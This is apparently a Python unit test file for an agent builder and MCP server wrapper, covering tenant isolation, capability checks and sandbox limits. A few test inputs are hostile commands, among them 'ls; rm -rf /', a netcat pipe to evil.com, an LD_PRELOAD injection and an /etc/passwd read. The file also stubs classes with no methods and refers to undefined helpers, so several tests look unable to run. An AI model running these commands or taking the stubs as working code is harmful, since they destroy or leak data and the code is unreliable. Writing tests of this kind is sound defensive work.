"""
Unit Tests for Agent & MCP Systems

Tests agent templates, builder service, and MCP server integration.
Verifies security, isolation, and capability-based access control.
"""

import pytest
import asyncio
import json
import os
import stat
from datetime import datetime, timedelta
from pathlib import Path
from unittest.mock import Mock, AsyncMock, patch, MagicMock
import tempfile

from app.models.assistant_template import (
    AssistantTemplate, AssistantInstance, AssistantBuilder,
    AssistantType, PersonalityConfig, ResourcePreferences, MemorySettings,
    AssistantTemplateLibrary, BUILTIN_TEMPLATES
)
from app.services.assistant_builder import AssistantBuilderService
from app.models.access_group import AccessGroup

# Mock imports for resource cluster services (would be separate in production)
class MCPServerStatus:
    HEALTHY = "healthy"
    STOPPED = "stopped"

class MCPServerConfig:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)

class MCPServerResource:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)

class SecureMCPWrapper:
    def __init__(self, **kwargs):
        pass

class SandboxConfig:
    def __init__(self, **kwargs):
        self.max_memory_mb = kwargs.get('max_memory_mb', 512)
        self.max_cpu_percent = kwargs.get('max_cpu_percent', 50)
        self.timeout_seconds = kwargs.get('timeout_seconds', 30)
        self.network_isolation = kwargs.get('network_isolation', True)
        self.blocked_paths = ["/etc", "/root"]
        self.allowed_paths = ["/tmp", "/var/tmp"]
        self.allowed_commands = kwargs.get('allowed_commands', ["ls", "cat", "echo"])

class ProcessSandbox:
    def __init__(self, config):
        self.config = config
        self.temp_dir = None


class TestAssistantTemplates:
    """Test agent template models and functionality"""
    
    def test_builtin_templates_loaded(self):
        """Test that all builtin templates are properly defined"""
        assert len(BUILTIN_TEMPLATES) == 4
        assert AssistantType.RESEARCH in BUILTIN_TEMPLATES
        assert AssistantType.CODING in BUILTIN_TEMPLATES
        assert AssistantType.CYBER_ANALYST in BUILTIN_TEMPLATES
        assert AssistantType.EDUCATIONAL in BUILTIN_TEMPLATES
    
    def test_template_to_instance_conversion(self):
        """Test converting template to user instance"""
        template = BUILTIN_TEMPLATES[AssistantType.RESEARCH]
        
        instance = template.to_instance(
            user_id="test@example.com",
            instance_name="My Research Agent",
            tenant_domain="customer1.com"
        )
        
        assert instance.template_id == template.template_id
        assert instance.name == "My Research Agent"
        assert instance.owner_id == "test@example.com"
        assert instance.tenant_domain == "customer1.com"
        assert instance.access_group == AccessGroup.INDIVIDUAL
        assert instance.system_prompt == template.system_prompt
        assert instance.capabilities == template.default_capabilities
    
    def test_assistant_file_structure(self):
        """Test agent file structure generation"""
        instance = AssistantInstance(
            id="test-123",
            name="Test Agent",
            resource_type="agent",
            owner_id="test@example.com",
            tenant_domain="customer1.com",
            access_group=AccessGroup.INDIVIDUAL,
            team_members=[],
            created_at=datetime.utcnow(),
            updated_at=datetime.utcnow(),
            metadata={},
            system_prompt="Test prompt",
            capabilities=["llm:gpt-4"]
        )
        
        file_structure = instance.get_file_structure()
        
        assert "config" in file_structure
        assert "prompt" in file_structure
        assert "capabilities" in file_structure
        assert "memory" in file_structure
        assert "resources" in file_structure
        
        # Check paths are properly formatted
        base = f"/data/customer1.com/users/test@example.com/agents/test-123"
        assert file_structure["config"] == f"{base}/config.json"
        assert file_structure["prompt"] == f"{base}/prompt.md"
    
    def test_custom_assistant_builder(self):
        """Test custom agent builder"""
        builder = AssistantBuilder(
            name="Custom Agent",
            description="My custom agent",
            system_prompt="You are a custom agent",
            personality_config=PersonalityConfig(tone="casual"),
            resource_preferences=ResourcePreferences(primary_llm="claude-sonnet"),
            memory_settings=MemorySettings(conversation_retention="permanent"),
            requested_capabilities=["llm:claude-sonnet", "rag:semantic_search"]
        )
        
        instance = builder.build_instance(
            user_id="test@example.com",
            tenant_domain="customer1.com"
        )
        
        assert instance.name == "Custom Agent"
        assert instance.template_id is None  # Custom build has no template
        assert instance.personality_config.tone == "casual"
        assert instance.resource_preferences.primary_llm == "claude-sonnet"
        assert instance.memory_settings.conversation_retention == "permanent"
        assert "llm:claude-sonnet" in instance.capabilities
    
    def test_assistant_dataset_linking(self):
        """Test linking RAG datasets to agent"""
        instance = AssistantInstance(
            id="test-123",
            name="Test Agent",
            resource_type="agent",
            owner_id="test@example.com",
            tenant_domain="customer1.com",
            access_group=AccessGroup.INDIVIDUAL,
            team_members=[],
            created_at=datetime.utcnow(),
            updated_at=datetime.utcnow(),
            metadata={},
            system_prompt="Test",
            capabilities=[]
        )
        
        # Add dataset
        instance.add_linked_dataset("dataset-123")
        assert "dataset-123" in instance.linked_datasets
        assert len(instance.linked_datasets) == 1
        
        # Add duplicate (should not add)
        instance.add_linked_dataset("dataset-123")
        assert len(instance.linked_datasets) == 1
        
        # Remove dataset
        instance.remove_linked_dataset("dataset-123")
        assert "dataset-123" not in instance.linked_datasets
        assert len(instance.linked_datasets) == 0


class TestAssistantBuilderService:
    """Test agent builder service functionality"""
    
    @pytest.fixture
    def builder_service(self, tmp_path):
        """Create builder service with temp directory"""
        with patch("app.services.assistant_builder.Path") as mock_path:
            mock_path.return_value = tmp_path / "customer1.com" / "agents"
            service = AssistantBuilderService(
                tenant_domain="customer1.com",
                resource_cluster_url="http://localhost:8004"
            )
            service.base_path = tmp_path / "customer1.com" / "agents"
            service.base_path.mkdir(parents=True, exist_ok=True)
            return service
    
    @pytest.mark.asyncio
    async def test_create_from_template(self, builder_service):
        """Test creating agent from template"""
        with patch("app.services.assistant_builder.verify_capability_token") as mock_verify:
            mock_verify.return_value = {"tenant_id": "customer1.com"}
            
            instance = await builder_service.create_from_template(
                template_id="research_assistant_v1",
                user_id="test@example.com",
                instance_name="My Research Agent",
                capability_token="valid-token"
            )
            
            assert instance.name == "My Research Agent"
            assert instance.template_id == "research_assistant_v1"
            assert instance.owner_id == "test@example.com"
            assert instance.config_file_path is not None
            
            # Check files were created
            config_path = Path(instance.config_file_path)
            assert config_path.exists()
            
            # Check file permissions
            file_stat = os.stat(config_path)
            assert oct(file_stat.st_mode)[-3:] == "600"
    
    @pytest.mark.asyncio
    async def test_create_custom_assistant(self, builder_service):
        """Test creating custom agent"""
        builder_config = AssistantBuilder(
            name="Custom Bot",
            system_prompt="Custom prompt",
            requested_capabilities=["llm:gpt-4"]
        )
        
        with patch("app.services.assistant_builder.verify_capability_token") as mock_verify:
            mock_verify.return_value = {
                "tenant_id": "customer1.com",
                "capabilities": [{"resource": "llm:gpt-4"}]
            }
            
            instance = await builder_service.create_custom(
                builder_config=builder_config,
                user_id="test@example.com",
                capability_token="valid-token"
            )
            
            assert instance.name == "Custom Bot"
            assert instance.template_id is None
            assert instance.system_prompt == "Custom prompt"
    
    @pytest.mark.asyncio
    async def test_share_assistant(self, builder_service, tmp_path):
        """Test sharing agent with team"""
        # Create test agent
        instance = AssistantInstance(
            id="test-123",
            name="Test Agent",
            resource_type="agent",
            owner_id="test@example.com",
            tenant_domain="customer1.com",
            access_group=AccessGroup.INDIVIDUAL,
            team_members=[],
            created_at=datetime.utcnow(),
            updated_at=datetime.utcnow(),
            metadata={},
            system_prompt="Test",
            capabilities=[]
        )
        
        # Save it
        await builder_service._save_assistant(instance)
        
        with patch.object(builder_service, '_load_assistant', return_value=instance):
            updated = await builder_service.share_assistant(
                agent_id="test-123",
                user_id="test@example.com",
                access_group=AccessGroup.TEAM,
                team_members=["alice@example.com", "bob@example.com"]
            )
            
            assert updated.access_group == AccessGroup.TEAM
            assert len(updated.team_members) == 2
            assert "alice@example.com" in updated.team_members
    
    @pytest.mark.asyncio
    async def test_permission_check_on_get(self, builder_service):
        """Test permission checking when getting agent"""
        instance = AssistantInstance(
            id="test-123",
            name="Private Agent",
            resource_type="agent",
            owner_id="owner@example.com",
            tenant_domain="customer1.com",
            access_group=AccessGroup.INDIVIDUAL,
            team_members=[],
            created_at=datetime.utcnow(),
            updated_at=datetime.utcnow(),
            metadata={},
            system_prompt="Private",
            capabilities=[]
        )
        
        with patch.object(builder_service, '_load_assistant', return_value=instance):
            # Owner should get access
            result = await builder_service.get_assistant("test-123", "owner@example.com")
            assert result is not None
            
            # Non-owner should not get access to individual agent
            result = await builder_service.get_assistant("test-123", "other@example.com")
            assert result is None


class TestMCPServerIntegration:
    """Test MCP server resource wrapper"""
    
    @pytest.fixture
    def mcp_wrapper(self):
        """Create MCP wrapper instance"""
        return SecureMCPWrapper(resource_cluster_url="http://localhost:8004")
    
    @pytest.mark.asyncio
    async def test_register_mcp_server(self, mcp_wrapper):
        """Test registering MCP server as resource"""
        config = MCPServerConfig(
            server_name="filesystem",
            server_url="mcp://filesystem",
            server_type="filesystem",
            available_tools=["read", "write", "list"],
            required_capabilities=["mcp:filesystem:*"],
            sandbox_mode=True,
            max_memory_mb=256
        )
        
        resource = await mcp_wrapper.register_mcp_server(
            server_config=config,
            owner_id="admin@gt2.com",
            tenant_domain="customer1.com",
            access_group=AccessGroup.ORGANIZATION
        )
        
        assert resource.name == "MCP Server: filesystem"
        assert resource.resource_type == "mcp_server"
        assert resource.owner_id == "admin@gt2.com"
        assert resource.access_group == AccessGroup.ORGANIZATION
        assert resource.server_config.server_name == "filesystem"
        assert len(resource.server_config.available_tools) == 3
    
    @pytest.mark.asyncio
    async def test_execute_tool_with_capability_check(self, mcp_wrapper):
        """Test executing MCP tool with capability validation"""
        # Register server
        config = MCPServerConfig(
            server_name="github",
            server_url="mcp://github",
            server_type="github",
            available_tools=["list_repos", "get_file"],
            required_capabilities=["mcp:github:*"]
        )
        
        resource = await mcp_wrapper.register_mcp_server(
            server_config=config,
            owner_id="admin@gt2.com",
            tenant_domain="customer1.com"
        )
        
        with patch("app.services.mcp_server.verify_capability_token") as mock_verify:
            mock_verify.return_value = {
                "tenant_id": "customer1.com",
                "capabilities": [{"resource": "mcp:github:list_repos"}]
            }
            
            result = await mcp_wrapper.execute_tool(
                mcp_resource_id=resource.id,
                tool_name="list_repos",
                parameters={"org": "test-org"},
                capability_token="valid-token",
                user_id="test@example.com"
            )
            
            assert result["status"] == "success"
            assert result["tool"] == "list_repos"
    
    @pytest.mark.asyncio
    async def test_tool_access_denied_without_capability(self, mcp_wrapper):
        """Test tool access denied without proper capability"""
        # Register server
        config = MCPServerConfig(
            server_name="sensitive",
            server_url="mcp://sensitive",
            server_type="custom",
            available_tools=["admin_action"],
            required_capabilities=["mcp:sensitive:admin_action"]
        )
        
        resource = await mcp_wrapper.register_mcp_server(
            server_config=config,
            owner_id="admin@gt2.com",
            tenant_domain="customer1.com"
        )
        
        with patch("app.services.mcp_server.verify_capability_token") as mock_verify:
            mock_verify.return_value = {
                "tenant_id": "customer1.com",
                "capabilities": []  # No capabilities!
            }
            
            with pytest.raises(PermissionError) as exc:
                await mcp_wrapper.execute_tool(
                    mcp_resource_id=resource.id,
                    tool_name="admin_action",
                    parameters={},
                    capability_token="limited-token",
                    user_id="test@example.com"
                )
            
            assert "No capability for tool" in str(exc.value)
    
    @pytest.mark.asyncio
    async def test_constraint_application(self, mcp_wrapper):
        """Test applying constraints from capability token"""
        wrapper = mcp_wrapper
        
        # Test path restriction
        constraints = {
            "allowed_paths": ["/home/user", "/tmp"]
        }
        
        parameters = {"path": "/etc/passwd"}
        
        with pytest.raises(PermissionError) as exc:
            wrapper._apply_constraints(parameters, constraints)
        
        assert "Path not allowed" in str(exc.value)
        
        # Test allowed path
        parameters = {"path": "/tmp/test.txt"}
        result = wrapper._apply_constraints(parameters, constraints)
        assert result["path"] == "/tmp/test.txt"


class TestMCPSandbox:
    """Test MCP sandbox security and isolation"""
    
    def test_sandbox_config_defaults(self):
        """Test sandbox configuration defaults"""
        config = SandboxConfig()
        
        assert config.max_memory_mb == 512
        assert config.max_cpu_percent == 50
        assert config.timeout_seconds == 30
        assert config.network_isolation == True
        assert "/etc" in config.blocked_paths
        assert "/tmp" in config.allowed_paths
    
    @pytest.mark.asyncio
    async def test_process_sandbox_creation(self):
        """Test process sandbox creation and cleanup"""
        config = SandboxConfig(max_memory_mb=128)
        
        async with ProcessSandbox(config) as sandbox:
            assert sandbox.temp_dir is not None
            assert sandbox.temp_dir.exists()
            
            # Check directory permissions
            dir_stat = os.stat(sandbox.temp_dir)
            assert oct(dir_stat.st_mode)[-3:] == "700"
        
        # After context exit, temp dir should be cleaned up
        assert not sandbox.temp_dir.exists()
    
    @pytest.mark.asyncio
    async def test_command_validation(self):
        """Test command validation in sandbox"""
        config = SandboxConfig(
            allowed_commands=["ls", "cat", "echo"]
        )
        sandbox = ProcessSandbox(config)
        
        # Allowed command
        assert sandbox._validate_command("ls") == True
        assert sandbox._validate_command("cat") == True
        
        # Disallowed command
        assert sandbox._validate_command("rm") == False
        assert sandbox._validate_command("dd") == False
        
        # Dangerous patterns
        assert sandbox._validate_command("ls; rm -rf /") == False
        assert sandbox._validate_command("cat | nc evil.com 1234") == False
        assert sandbox._validate_command("echo $(whoami)") == False
    
    @pytest.mark.asyncio
    async def test_sandbox_execution_with_timeout(self):
        """Test sandbox execution with timeout"""
        config = SandboxConfig(timeout_seconds=1)
        
        async with ProcessSandbox(config) as sandbox:
            # Fast command should succeed
            returncode, stdout, stderr = await sandbox.execute("echo", ["test"])
            assert returncode == 0
            assert "test" in stdout
            
            # Slow command should timeout
            with pytest.raises(TimeoutError):
                await sandbox.execute("sleep", ["5"])
    
    def test_environment_preparation(self):
        """Test environment variable preparation"""
        config = SandboxConfig()
        sandbox = ProcessSandbox(config)
        
        custom_env = {
            "MY_VAR": "test",
            "LD_PRELOAD": "/evil/lib.so",  # Should be filtered
            "PATH": "/evil/bin:$PATH"  # Should be filtered
        }
        
        env = sandbox._prepare_environment(custom_env)
        
        assert env["MY_VAR"] == "test"
        assert "LD_PRELOAD" not in env
        assert env["PATH"] == "/usr/local/bin:/usr/bin:/bin"  # Not modified
        assert env["HOME"] == str(sandbox.temp_dir)
    
    def test_sandbox_factory(self):
        """Test sandbox factory function"""
        config = SandboxConfig()
        
        # Should return ProcessSandbox when no container runtime
        with patch("shutil.which", return_value=None):
            sandbox = create_sandbox(config, prefer_container=True)
            assert isinstance(sandbox, ProcessSandbox)
        
        # Should return ContainerSandbox when Docker available
        with patch("shutil.which", side_effect=lambda x: "/usr/bin/docker" if x == "docker" else None):
            sandbox = create_sandbox(config, prefer_container=True)
            assert isinstance(sandbox, ContainerSandbox)
            assert sandbox.container_runtime == "docker"


class TestSecurityScenarios:
    """Test security scenarios for Agent & MCP systems"""
    
    @pytest.mark.asyncio
    async def test_cross_tenant_mcp_access_blocked(self):
        """Test that cross-tenant MCP access is blocked"""
        wrapper = SecureMCPWrapper()
        
        # Register MCP for tenant1
        config = MCPServerConfig(
            server_name="tenant1-mcp",
            server_url="mcp://tenant1",
            server_type="custom",
            available_tools=["tool1"]
        )
        
        resource = await wrapper.register_mcp_server(
            server_config=config,
            owner_id="admin@tenant1.com",
            tenant_domain="tenant1.com"
        )
        
        # Try to access from tenant2
        with patch("app.services.mcp_server.verify_capability_token") as mock_verify:
            mock_verify.return_value = {
                "tenant_id": "tenant2.com",  # Different tenant!
                "capabilities": [{"resource": "mcp:tenant1-mcp:*"}]
            }
            
            with pytest.raises(PermissionError) as exc:
                await wrapper.execute_tool(
                    mcp_resource_id=resource.id,
                    tool_name="tool1",
                    parameters={},
                    capability_token="cross-tenant-token",
                    user_id="attacker@tenant2.com"
                )
            
            assert "Tenant mismatch" in str(exc.value)
    
    @pytest.mark.asyncio
    async def test_assistant_file_permission_security(self):
        """Test agent files have proper permissions"""
        with tempfile.TemporaryDirectory() as tmpdir:
            service = AssistantBuilderService(
                tenant_domain="customer1.com"
            )
            service.base_path = Path(tmpdir) / "customer1.com" / "agents"
            service.base_path.mkdir(parents=True)
            
            instance = AssistantInstance(
                id="test-123",
                name="Test",
                resource_type="agent",
                owner_id="test@example.com",
                tenant_domain="customer1.com",
                access_group=AccessGroup.INDIVIDUAL,
                team_members=[],
                created_at=datetime.utcnow(),
                updated_at=datetime.utcnow(),
                metadata={},
                system_prompt="Test",
                capabilities=[]
            )
            
            await service._create_assistant_files(instance)
            
            # Check all created files have 600 permissions
            config_path = Path(instance.config_file_path)
            assert oct(os.stat(config_path).st_mode)[-3:] == "600"
            
            # Check directories have 700 permissions
            memory_path = Path(instance.memory_file_path)
            assert oct(os.stat(memory_path).st_mode)[-3:] == "700"
    
    @pytest.mark.asyncio
    async def test_capability_requirement_for_custom_assistant(self):
        """Test capability requirements are enforced for custom agents"""
        service = AssistantBuilderService("customer1.com")
        
        builder_config = AssistantBuilder(
            name="Advanced Bot",
            system_prompt="Advanced prompt",
            requested_capabilities=["llm:gpt-4", "tools:github", "rag:premium"]
        )
        
        # Missing required capabilities
        with patch("app.services.assistant_builder.verify_capability_token") as mock_verify:
            mock_verify.return_value = {
                "tenant_id": "customer1.com",
                "capabilities": [{"resource": "llm:gpt-3.5"}]  # Wrong model!
            }
            
            with pytest.raises(PermissionError) as exc:
                await service.create_custom(
                    builder_config=builder_config,
                    user_id="test@example.com",
                    capability_token="limited-token"
                )
            
            assert "Missing capability: llm:gpt-4" in str(exc.value)